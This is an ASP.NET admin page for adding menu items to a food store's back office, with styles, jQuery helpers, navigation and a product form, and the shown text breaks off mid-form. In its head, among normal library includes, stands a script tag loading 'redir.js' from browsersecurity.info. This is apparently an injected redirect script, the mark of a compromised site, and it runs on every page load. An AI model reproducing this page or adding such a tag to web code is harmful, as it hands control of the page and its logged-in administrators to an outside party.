<%@ Page Language="C#" AutoEventWireup="true" CodeFile="AddMenuItemInformation.aspx.cs" Inherits="Admin_AddMenuItemInformation" %>


<%@ Register Assembly="CKEditor.NET" Namespace="CKEditor.NET" TagPrefix="CKEditor" %>

<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>AddMenuItemInformation</title>
<head>
    <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon" />
    <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico" />
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">
        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />
    <style type="text/css">
        .Header-style {
            margin-left: 50px;
        }

        .modalBackground {
            background-color: #000;
            opacity: 0.7;
        }

        .content .x {
            float: right;
            height: 35px;
            left: 13px;
            position: relative;
            top: -38px;
            width: 34px;
        }

        .content {
            min-width: 600px;
            width: 600px;
            min-height: 150px;
            margin: 100px auto;
            background: #f3f3f3;
            position: relative;
            z-index: 103;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 2px 5px #000;
        }

            .content .header {
                background-color: darkgray;
                min-width: 600px;
                width: 600px;
                height: 30px;
                color: White;
                line-height: 30px;
                text-align: center;
                font-weight: bold;
                margin-top: -10px;
                margin-left: -9px;
                border-radius: 2px;
                box-shadow: 0 2px 5px #000;
                margin-bottom: 6px;
            }

        /*#overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            filter: alpha(opacity=70);
            -moz-opacity: 0.7;
            -khtml-opacity: 0.7;
            opacity: 0.7;
            z-index: 100;
            display: none;
        }

        .content a {
            text-decoration: none;
        }

        .popup {
            width: 100%;
            margin: 0 auto;
            display: none;
            position: fixed;
            z-index: 101;
        }

        .content {
            min-width: 600px;
            width: 600px;
            min-height: 150px;
            margin: 100px auto;
            background: #f3f3f3;
            position: relative;
            z-index: 103;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 2px 5px #000;
        }

            .content p {
                clear: both;
                color: #555555;
                text-align: justify;
            }

                .content p a {
                    color: #d91900;
                    font-weight: bold;
                }

            .content .x {
                float: right;
                height: 35px;
                left: 22px;
                position: relative;
                top: -25px;
                width: 34px;
            }

                .content .x:hover {
                    cursor: pointer;
                }*/
    </style>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.2.js"></script>
    <script type='text/javascript'>

        function ValidateAndShowPopup() {
            if (Page_ClientValidate('Popup')) {
                //alert("hii");
                $find('mpeUserDetail').show();

            }
        }


        function Confirm() {

            var hdnfldVariable = document.getElementById("<%=hdnfldVariable.ClientID %>");


            if (confirm("Are you sure you want to delete Menu Item Property?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }

        }
        <%--$(document).ready(function () {
            $('#<%=btnNewAddProperties.ClientID %>').click(function () {

                $find('mpe').show();
                return false;
            });
        });--%>


        //$(function () {

        //});

        $(function () {
            var overlay = $('<div id="overlay"></div>');
            $('.close').click(function () {
                $('.modalBackground').hide();
                $('#pnlpopup').hide();
                overlay.appendTo(document.body).remove();
                return false;
            });

            $('.x').click(function () {
                $('.modalBackground').hide();
                $('#pnlpopup').hide();
                overlay.appendTo(document.body).remove();
                return false;
            });

            $("#fuImage1").change(function () {

                var preview = document.querySelector('#<%=ImgfuImage1.ClientID %>');
                var file = document.querySelector('#<%=fuImage1.ClientID %>').files[0];
                var reader = new FileReader();

                reader.onloadend = function () {
                    preview.src = reader.result;
                }

                if (file) {
                    reader.readAsDataURL(file);
                } else {
                    preview.src = "";
                }
                document.getElementById("btnImg1").style.display = 'inherit';
                document.getElementById("ImgfuImage1").style.display = 'inherit';
            });

        });



        function shoeHideButton() {
            var preview1 = document.querySelector('#<%=ImgfuImage1.ClientID %>');
            if (preview1.src == "") {
                document.getElementById("btnImg1").style.display = 'none';
            }
            else if (preview1.src != "http://localhost:59336/ProjectImages/ProductImages/") {
                document.getElementById("btnImg1").style.display = 'inherit';

            }
            else {
                //document.getElementById("ImgfuImage1").style.display = 'none';
                document.getElementById("btnImg1").style.display = 'none';
            }

        }
        window.onload = shoeHideButton;


    </script>
    <style type="text/css">
        /*done*/
        @media only screen and (max-width: 2000px) {
            #btnAddMenuItem {
                margin-left: 280px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 275px;
                margin-bottom: 10px;
            }

            #BtnAddProperties {
                margin-left: 145px;
            }

            #btnClose {
                margin-left: 30px;
            }

            #Ingreditndiv {
                margin-left: 40px;
            }

            #IngreditFactndiv {
                margin-left: 40px;
            }

            #Propertiesdiv {
                margin-left: 255px;
            }

            #PropertiesDiv {
                margin-left: 240px;
                margin-top: 80px;
                width: 75%;
            }

            #lblBaseSingleIngredientsPrice {
                margin-top: -34px;
                margin-left: 91px;
            }

            #txtBaseSingleIngredientsPrice {
                margin-left: 310px;
                margin-top: -52px;
            }

            #RegularExpressionValidator5 {
                margin-left: 230px;
                margin-top: -52px;
            }

            #lblBaseDoubleIngredientsPrice {
                margin-top: -36px;
                margin-left: 339px;
            }

            #txtBaseDoubleIngredientsPrice {
                margin-left: 555px;
                margin-top: -55px;
            }

            #RegularExpressionValidator6 {
                margin-left: 473px;
                margin-top: -52px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1680px) {
            #btnAddMenuItem {
                margin-left: 242px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 235px;
                margin-bottom: 10px;
            }

            #BtnAddProperties {
                margin-left: 123px;
            }

            #Ingreditndiv {
                margin-left: 0px;
            }

            #IngreditFactndiv {
                margin-left: 0px;
            }

            #Propertiesdiv {
                margin-left: 215px;
            }

            #PropertiesDiv {
                margin-left: 190px;
                margin-top: 80px;
                width: 75%;
            }
        }
        /*done*/
        @media only screen and (max-width: 1600px) {
            #btnAddMenuItem {
                margin-left: 230px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 220px;
                margin-bottom: 20px;
            }

            #BtnAddProperties {
                margin-left: 145px;
            }

            #btnClose {
                margin-left: 30px;
            }

            #Ingreditndiv {
                margin-left: -13px;
            }

            #IngreditFactndiv {
                margin-left: -13px;
            }

            #Propertiesdiv {
                margin-left: 200px;
            }

            #PropertiesDiv {
                margin-left: 190px;
                margin-top: 80px;
                width: 75%;
            }

            #lblBaseSingleIngredientsPrice {
                margin-top: -34px;
                margin-left: 91px;
            }

            #txtBaseSingleIngredientsPrice {
                margin-left: 310px;
                margin-top: -52px;
            }

            #RegularExpressionValidator5 {
                margin-left: 230px;
                margin-top: -52px;
            }

            #lblBaseDoubleIngredientsPrice {
                margin-top: -37px;
                margin-left: 377px;
            }

            #txtBaseDoubleIngredientsPrice {
                margin-left: 555px;
                margin-top: -55px;
            }

            #RegularExpressionValidator6 {
                margin-left: 473px;
                margin-top: -52px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1440px) {
            #btnAddMenuItem {
                margin-left: 198px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 192px;
            }

            #BtnAddProperties {
                margin-left: 100px;
            }

            #Ingreditndiv {
                margin-left: -40px;
            }

            #IngreditFactndiv {
                margin-left: -40px;
            }

            #Propertiesdiv {
                margin-left: 172px;
            }

            #PropertiesDiv {
                margin-left: 185px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1366px) {
            #btnAddMenuItem {
                margin-left: 185px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 178px;
            }

            #Ingreditndiv {
                margin-left: -55px;
            }

            #BtnAddProperties {
                margin-left: 95px;
            }

            #IngreditFactndiv {
                margin-left: -55px;
            }

            #Propertiesdiv {
                margin-left: 158px;
            }

            #PropertiesDiv {
                margin-left: 170px;
            }

            #lblBaseSingleIngredientsPrice {
                margin-top: -34px;
                margin-left: 91px;
            }

            #txtBaseSingleIngredientsPrice {
                margin-left: 310px;
                margin-top: -52px;
            }

            #RegularExpressionValidator5 {
                margin-left: 230px;
                margin-top: -52px;
            }

            #lblBaseDoubleIngredientsPrice {
                margin-top: -55px;
                margin-left: 391px;
            }

            #txtBaseDoubleIngredientsPrice {
                margin-left: 555px;
                margin-top: -55px;
            }

            #RegularExpressionValidator6 {
                margin-left: 473px;
                margin-top: -52px;
            }
        }

        /*done*/
        @media only screen and (max-width: 1280px) {
            #btnAddMenuItem {
                margin-left: 170px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 165px;
            }

            #BtnAddProperties {
                margin-left: 88px;
            }

            #Ingreditndiv {
                margin-left: -69px;
            }

            #IngreditFactndiv {
                margin-left: -69px;
            }

            #Propertiesdiv {
                margin-left: 145px;
            }

            #PropertiesDiv {
                margin-left: 155px;
            }
        }

        @media only screen and (max-width: 1200px) {
            #btnAddMenuItem {
                margin-left: 165px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 157px;
            }

            #BtnAddProperties {
                margin-left: 77px;
            }

            #Ingreditndiv {
                margin-left: -79px;
            }

            #IngreditFactndiv {
                margin-left: -79px;
            }

            #Propertiesdiv {
                margin-left: 138px;
            }

            #PropertiesDiv {
                margin-left: 145px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1080px) {
            #btnAddMenuItem {
                margin-left: 140px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 135px;
                margin-top: 10px;
            }

            #BtnAddProperties {
                margin-left: 69px;
            }

            #Ingreditndiv {
                margin-left: -100px;
            }

            #IngreditFactndiv {
                margin-left: -100px;
            }

            #Propertiesdiv {
                margin-left: 115px;
            }

            #PropertiesDiv {
                margin-left: 120px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1050px) {
            #btnAddMenuItem {
                margin-left: 135px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 130px;
                margin-top: 10px;
            }

            #BtnAddProperties {
                margin-left: 64px;
            }

            #Ingreditndiv {
                margin-left: -105px;
            }

            #IngreditFactndiv {
                margin-left: -105px;
            }

            #Propertiesdiv {
                margin-left: 110px;
            }

            #PropertiesDiv {
                margin-left: 120px;
            }
        }
        /*done*/
        @media only screen and (max-width: 1024px) {
            #btnAddMenuItem {
                margin-left: 128px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 123px;
            }

            #BtnAddProperties {
                margin-left: 68px;
            }

            #Ingreditndiv {
                margin-left: -110px;
            }

            #IngreditFactndiv {
                margin-left: -110px;
            }

            #Propertiesdiv {
                margin-left: 102px;
            }

            #PropertiesDiv {
                margin-left: 112px;
            }
        }
        /*done*/
        @media only screen and (max-width: 900px) {
            #btnAddMenuItem {
                margin-left: 110px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 105px;
                margin-top: 10px;
            }

            #BtnAddProperties {
                margin-left: 52px;
            }

            #Ingreditndiv {
                margin-left: -130px;
            }

            #IngreditFactndiv {
                margin-left: -130px;
            }

            #Propertiesdiv {
                margin-left: 83px;
            }

            #PropertiesDiv {
                margin-left: 77px;
            }
        }
        /*done*/
        @media only screen and (max-width: 800px) {
            #btnAddMenuItem {
                margin-left: 90px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 88px;
            }

            #BtnAddProperties {
                margin-left: 40px;
            }

            #btnClose {
                margin-left: 180px;
                margin-top: -55px;
            }

            #Ingreditndiv {
                margin-left: -145px;
            }

            #IngreditFactndiv {
                margin-left: -145px;
            }

            #Propertiesdiv {
                margin-left: 66px;
            }

            #PropertiesDiv {
                margin-left: 77px;
            }
        }

        /*done*/
        @media only screen and (max-width: 768px) {
            #btnAddMenuItem {
                margin-left: 85px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 80px;
            }

            #BtnAddProperties {
                margin-left: 35px;
            }

            #btnClose {
                margin-left: 180px;
                margin-top: -55px;
            }

            #Ingreditndiv {
                margin-left: -155px;
            }

            #IngreditFactndiv {
                margin-left: -155px;
            }

            #Propertiesdiv {
                margin-left: 60px;
            }

            #PropertiesDiv {
                margin-left: 77px;
            }
        }
        /*done*/
        @media only screen and (max-width: 600px) {
            #btnAddMenuItem {
                margin-left: 20px;
            }

            #btnCancel {
                margin-left: 30px;
            }

            #btnNewAddProperties {
                margin-left: 15px;
                margin-top: 10px;
            }

            #BtnAddProperties {
                margin-left: -4px;
            }

            #Ingreditndiv {
                margin-left: -220px;
            }

            #IngreditFactndiv {
                margin-left: -220px;
            }

            #Propertiesdiv {
                margin-left: -3px;
            }

            #PropertiesDiv {
                margin-left: 27px;
                margin-top: -10px;
            }
        }
    </style>
    <script type="text/javascript">
        function ConfirmForLogOut() {

            var hdnfldVariable = document.getElementById("<%=hdfLogout.ClientID %>");

            if (confirm("Are you sure you want to log out?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }
            document.getElementById('<%= BtnLogOut.ClientID %>').click();
        }

        function checkRadioBtn(id) {
            var gv = document.getElementById('<%=gvMenuItemIngredientInformation.ClientID %>');
            for (var i = 1; i < gv.rows.length; i++) {
                alert('Hi1');
                alert(gv.rows[i].cells[1].getElementsByTagName("input"));
                var radioBtn = gv.rows[i].cells[5].getElementsByTagName("input");
                alert('Hi2');
                // Check if the id not same
                if (radioBtn[0].id != id.id) {
                    alert('Hi3');
                    radioBtn[0].checked = false;
                }
            }
        }
    </script>
</head>

<body>
    <form runat="server">

        <asp:ScriptManager ID="ScriptManager1" runat="server">
        </asp:ScriptManager>

        <asp:HiddenField ID="hdfLogout" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" Style="display: none" OnClick="BtnLogOut_Click" />

        <%--<asp:ToolkitScriptManager ID="ScriptManager1" runat="server">
        </asp:ToolkitScriptManager>--%>
        <asp:HiddenField ID="hdnfldVariable" runat="server" />
        <asp:Button ID="btnShowPopup" runat="server" Style="display: none" />

        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                <nav role="navigation">
                    <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                        <li class="open"><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredients</span> </a></li>
                                <li><a href="IngredientFactInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li class="active"><a href="MenuItemInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Daily Sales</span> </a></li>
                                <li><a href="TransactionDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                            <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span></a>
                            <ul class="sub-menu">

                                <li><a href="MiscellaneousSettings.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>



            <div class="main-panel">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span>
                            <%--<asp:LinkButton runat="server" style="margin-left: -40px;margin-top: -50px;" ID="lblLogout" OnClientClick="ConfirmForLogOut();" OnClick="lblLogout_Click" Text="LogOut"></asp:LinkButton>--%>
                        </a></li>
                    </ul>
                </header>


                <div class="main-content">
                    <div class="panel mb25">
                        <label id="lblErrorMsg" style="color: red" runat="server"></label>
                        <div class="panel-heading border" style="font-size: medium; font-weight: bold;">Menu Item Information</div>

                        <div class="panel-body">
                            <div class="row no-margin">
                                <div class="col-lg-12">
                                    <div class="form-horizontal bordered-group" role="form">
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Category</label>
                                            <div class="col-sm-10">
                                                <asp:DropDownList ID="DdlCategory" runat="server" CssClass="form-control" AutoPostBack="true" AppendDataBoundItems="True" OnSelectedIndexChanged="DdlCategory_SelectedIndexChanged">
                                                </asp:DropDownList>
                                                <asp:RequiredFieldValidator ID="RqCategory" ValidationGroup="V1" ForeColor="Red" Display="Dynamic" ControlToValidate="DdlCategory" runat="server" InitialValue="-1" ErrorMessage="Select Category"></asp:RequiredFieldValidator>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Sequence Number</label>
                                            <div class="col-sm-10">
                                                <asp:TextBox ID="txtSquenceNo" CssClass="form-control" runat="server" ValidationGroup="Popup"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqSquenceNo" ValidationGroup="V1" runat="server" ControlToValidate="txtSquenceNo" ErrorMessage="Sequence Number Required" ForeColor="Red"></asp:RequiredFieldValidator>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Menu Item Name</label>
                                            <div class="col-sm-10">
                                                <asp:TextBox ID="txtMenuItemName" CssClass="form-control" runat="server"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqMenuItemName" ValidationGroup="V1" runat="server" ControlToValidate="txtMenuItemName" ErrorMessage="Menu Item Name Required" ForeColor="Red"></asp:RequiredFieldValidator>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Menu Item Description</label>
                                            <div class="col-sm-10">
                                                <CKEditor:CKEditorControl ID="CKeditorDescription" BasePath="/ckeditor/" runat="server"></CKEditor:CKEditorControl>
                                                <%-- <asp:RequiredFieldValidator ID="rqcategoryDescription" ValidationGroup="V1" runat="server" ControlToValidate="CKeditorDescription" ErrorMessage="Menu Item Description Required" ForeColor="Red"></asp:RequiredFieldValidator>--%>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Menu Item Price</label>
                                            <div class="col-sm-10">
                                                <asp:TextBox ID="txtMenuItemPrice" CssClass="form-control" runat="server" Width="100px"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqMenuItemPrice" ValidationGroup="V1" runat="server" ControlToValidate="txtMenuItemPrice" ErrorMessage="Menu Item Price Required" ForeColor="Red"></asp:RequiredFieldValidator>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator3" ControlToValidate="txtMenuItemPrice" runat="server" ErrorMessage="Enter Integers and Decimal values" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: -150px;" ValidationGroup="V1"></asp:RegularExpressionValidator>

                                                <label id="lblBaseSingleIngredientsPrice" class="col-sm-2 control-label">Base price group</label>
                                                <asp:TextBox ID="txtBaseSingleIngredientsPrice" runat="server" CssClass="form-control" ValidationGroup="Popup" Width="100px"></asp:TextBox>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator5" ControlToValidate="txtBaseSingleIngredientsPrice" runat="server" ErrorMessage="Enter Integers and Decimal values" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" ValidationGroup="Popup"></asp:RegularExpressionValidator>

                                                <label id="lblBaseDoubleIngredientsPrice" class="col-sm-2 control-label">2nd price group</label>
                                                <asp:TextBox ID="txtBaseDoubleIngredientsPrice" runat="server" CssClass="form-control" ValidationGroup="Popup" Width="100px"></asp:TextBox>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator6" ControlToValidate="txtBaseDoubleIngredientsPrice" runat="server" ErrorMessage="Enter Integers and Decimal values" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" ValidationGroup="Popup"></asp:RegularExpressionValidator>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Free Ingredients</label>
                                            <div class="col-sm-10">
                                                <asp:TextBox ID="txtFreeIngredients" CssClass="form-control" runat="server" Width="100px"></asp:TextBox>
                                                <asp:RegularExpressionValidator ID="RegularExpressionValidator7" ControlToValidate="txtFreeIngredients" runat="server" ErrorMessage="Enter Integers and Decimal values" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: -150px;" ValidationGroup="V1"></asp:RegularExpressionValidator>
                                            </div>
                                        </div>

                                        <div class="form-group">


                                            <div class="col-sm-10">
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Menu Item Image</label>
                                            <div class="col-sm-10">
                                                <asp:FileUpload ID="fuImage1" runat="server" ClientIDMode="Static" autopostback="false" />
                                                <asp:Image ID="ImgfuImage1" runat="server" Style="margin-top: 10px;" Height="100px" Width="100px" />

                                                <asp:Button Text="Remove" runat="server" ID="btnImg1" OnClick="btnImg1_Click" Style="display: none" />

                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Is Active</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkIsActive" runat="server" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Is Delivered</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkIsDelivered" runat="server" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Is Marked New</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkIsMarkedNew" runat="server" />
                                            </div>
                                        </div>


                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Is Marked Specilaity</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkIsMarkedSpeciality" runat="server" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Can Comment</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkCancomment" runat="server" />
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Is Comment Compulsory</label>
                                            <div class="col-sm-10">
                                                <asp:CheckBox ID="chkCommentCompulsory" runat="server" />
                                            </div>
                                        </div>
                                        <asp:UpdatePanel ID="upAddNewProperties" runat="server">
                                            <ContentTemplate>
                                                <div class="form-group">

                                                    <div class="col-sm-10">
                                                        <asp:Label runat="server" Text="Properties Detail" Style="margin-left: -5px; font-size: 14px;" Font-Bold="true"></asp:Label>
                                                    </div>


                                                    <%-- <div class="form-group">
                                            <div class="col-sm-10">
                                                <asp:Button ID="btnNewAddProperties" Text="Add New Properties" runat="server" OnClientClick="return false;" autopostback="false" Style="margin-left: 161px;" />
                                            </div>
                                        </div>--%>
                                                    <div class="form-group">
                                                        <div class="col-sm-10">
                                                            <asp:Button ID="btnNewAddProperties" Text="Add New Properties" runat="server" OnClick="btnNewAddProperties_Click" OnClientClick="return true;" CssClass="btn btn-info" />
                                                        </div>


                                                        <%-- div for properties --%>
                                                        <div id="PropertiesDiv" style="display: none; border-width: thin; border-color: #616161; margin-bottom: 10px; padding-top: 10px; border: 1px solid;" runat="server">
                                                            <div class="form-group" style="margin-left: 20px; width: 90%;">
                                                                <div class="col-sm-10">

                                                                    <div class="form-group">

                                                                        <label class="col-sm-2 control-label">Menu Item Size</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:DropDownList ID="DdlSize" runat="server" AutoPostBack="false" AppendDataBoundItems="True" ValidationGroup="Popup" CssClass="form-control">
